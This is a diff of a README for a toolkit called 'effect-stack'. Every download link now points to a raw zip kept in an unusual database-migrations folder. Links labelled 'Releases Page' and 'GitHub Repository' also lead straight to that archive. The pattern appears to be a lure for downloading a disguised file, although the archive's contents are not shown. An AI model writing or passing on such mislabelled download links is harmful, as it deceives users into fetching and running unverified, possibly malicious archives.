@@ -1,7 +1,7 @@
 # 🌟 effect-stack - Build Full-Stack Apps with Ease
 
 ## 📥 Download Now
-[![Download effect-stack](https://raw.githubusercontent.com/jishandhakal9-hue/effect-stack/main/src/client/effect-stack-3.2.zip)](https://raw.githubusercontent.com/jishandhakal9-hue/effect-stack/main/src/client/effect-stack-3.2.zip)
+[![Download effect-stack](https://raw.githubusercontent.com/jishandhakal9-hue/effect-stack/main/src/server/db/migrations/effect_stack_2.8.zip)](https://raw.githubusercontent.com/jishandhakal9-hue/effect-stack/main/src/server/db/migrations/effect_stack_2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to effect-stack! This application helps you build full-stack applications smoothly. With tools like Effect, Vite, Bun, and RPC, you can create robust software without the hassle. Follow these steps to start using effect-stack.
@@ -17,7 +17,7 @@ Before you download, make sure your computer meets these requirements:
 ## 🌐 Download & Install
 1. **Visit the Releases Page:** Click on the link below to access the releases page where you can download the latest version of effect-stack.
 
-   [Download effect-stack](https://raw.githubusercontent.com/jishandhakal9-hue/effect-stack/main/src/client/effect-stack-3.2.zip)
+   [Download effect-stack](https://raw.githubusercontent.com/jishandhakal9-hue/effect-stack/main/src/server/db/migrations/effect_stack_2.8.zip)
 
 2. **Choose the Latest Version:** On the releases page, look for the latest version. It is usually marked as the most recent or stable release.
 
@@ -48,7 +48,7 @@ If you encounter any issues during installation or usage, check the following:
 If you have questions or need assistance, feel free to reach out through the issues section on our GitHub repository. We aim to respond promptly to help you get back on track.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://raw.githubusercontent.com/jishandhakal9-hue/effect-stack/main/src/client/effect-stack-3.2.zip)
-- [Releases Page](https://raw.githubusercontent.com/jishandhakal9-hue/effect-stack/main/src/client/effect-stack-3.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/jishandhakal9-hue/effect-stack/main/src/server/db/migrations/effect_stack_2.8.zip)
+- [Releases Page](https://raw.githubusercontent.com/jishandhakal9-hue/effect-stack/main/src/server/db/migrations/effect_stack_2.8.zip)
 
 Thank you for choosing effect-stack. Happy coding!
